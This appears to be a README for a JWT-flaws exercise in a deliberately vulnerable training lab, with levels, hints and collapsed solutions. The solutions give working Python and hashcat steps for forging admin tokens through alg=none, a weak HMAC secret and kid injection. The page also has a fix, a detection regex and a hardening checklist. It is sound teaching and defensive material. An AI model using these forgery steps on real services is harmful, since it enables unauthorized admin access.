# JWT Handling Flaws

**Scenario ID:** `jwt-flaws`  
**CWE:** [CWE-347 – Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)  
**OWASP:** A02:2021 Cryptographic Failures  
**MITRE ATT&CK:** [T1550.001 – Use Alternate Authentication Material: Application Access Token](https://attack.mitre.org/techniques/T1550/001/)  
**Endpoints:** `POST /api/auth/login`, `GET /api/auth/profile`

---

## Goal

Forge a JWT and access `/api/auth/profile` with `role=admin` without knowing the real signing secret.

---

## Levels

| Level | Defence | Gap |
|---|---|---|
| `low` | HS256 tokens issued; server also accepts `alg=none` (unsigned). | No signature verification when `alg=none` is declared. |
| `medium` | `alg=none` blocked; HS256 enforced. | Secret is `secret` — trivially crackable offline. |
| `high` | Strong random secret. `alg=none` blocked. | `kid` header is accepted and used to look up the key. `kid=dev` maps to the known weak secret `dev-secret`. |
| `impossible` | Algorithm pinned to `HS256` in code (not from header). `kid` ignored. Strong env-var secret. | Not exploitable. |

---

## Hints (spoiler-free)

- **Low:** Look at the token header. What algorithm does it declare? Can you change it to something that skips signature verification entirely?
- **Medium:** The token is now properly signed — but how strong is the secret? Try common words. What tool could help you crack an HMAC-signed token offline?
- **High:** Signature verification is working. But look at the token header more carefully. Is there a field that tells the server which key to use? What happens if you pick a different value for it?
- **Impossible:** Nothing to bypass here. Compare how the server selects its verification key in each level. What is the essential difference in the impossible implementation?

---

## Quick start

```bash
# 1. Login and get a token
curl -s -X POST http://localhost:5000/api/auth/login \
  -d "username=alice&password=alice-pass" | python -m json.tool

# 2. Access profile with the token
curl -s http://localhost:5000/api/auth/profile \
  -H "Authorization: Bearer <TOKEN>"
```

---

<details>
<summary>Solutions (expand only after attempting)</summary>

### Low — alg=none

The server decodes the JWT header first and, if `alg=none`, skips signature verification.

```python
import base64, json

def b64url(s):
    return base64.urlsafe_b64encode(s.encode()).rstrip(b"=").decode()

header  = b64url('{"alg":"none","typ":"JWT"}')
payload = b64url(json.dumps({"sub": "alice", "role": "admin"}))
token   = f"{header}.{payload}."   # empty signature

# Submit to /api/auth/profile as Bearer token
```

### Medium — crack the HMAC secret

```bash
# Using hashcat (mode 16500 = JWT HS256)
hashcat -a 0 -m 16500 <token_from_login> wordlist.txt

# Or jwt_tool:
python3 jwt_tool.py <token> -C -d wordlist.txt
```

Once cracked (`secret`), forge with admin role:

```python
import jwt
forged = jwt.encode({"sub": "alice", "role": "admin"}, "secret", algorithm="HS256")
```

### High — kid injection

The server uses the `kid` header to select the signing key from a registry.
`kid=dev` → key `dev-secret` (discoverable from the source or by brute-forcing the registry).

```python
import jwt
forged = jwt.encode(
    {"sub": "alice", "role": "admin"},
    "dev-secret",
    algorithm="HS256",
    headers={"kid": "dev"},
)
```

### Fix (Impossible level)

```python
# Pin the algorithm explicitly in code — never read from token header.
# Ignore kid entirely.
payload = jwt.decode(
    token,
    strong_secret,            # from env var
    algorithms=["HS256"],     # hardcoded, not from header
)
```

The critical change: `algorithms=["HS256"]` is a **code constant**, not derived from the token. PyJWT 2.x enforces this correctly.

</details>

---

## Blue-team notes

### Detection

Wazuh rule IDs: **100508** (alg=none), **100509** (suspicious kid header)  
Shared detection pattern: `(?i)alg.*none|"alg"\s*:\s*"none"|kid.*injection|eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.$`

What to log:
- Full `Authorization` header value (truncated, to catch malformed tokens)
- Request path and method
- Response status code

### Likely false positives

- Security scanners sending malformed tokens
- Developers using `alg=none` in test environments (should never reach production logs)
- Log entries where "none" appears in an unrelated token field

### Hardening checklist

- [ ] Set `HONEYSCOPE_JWT_SECRET` to a strong random value: `python -c "import secrets; print(secrets.token_urlsafe(32))"`
- [ ] Pin the JWT algorithm to `HS256` (or `RS256` with RSA keys) in code
- [ ] Never read `alg` from the token header to decide which algorithm to use
- [ ] Never expose kid → secret mappings to users; use opaque identifiers
- [ ] Rotate JWT secrets on a schedule
- [ ] Use short token expiry times (`exp` claim) and refresh tokens
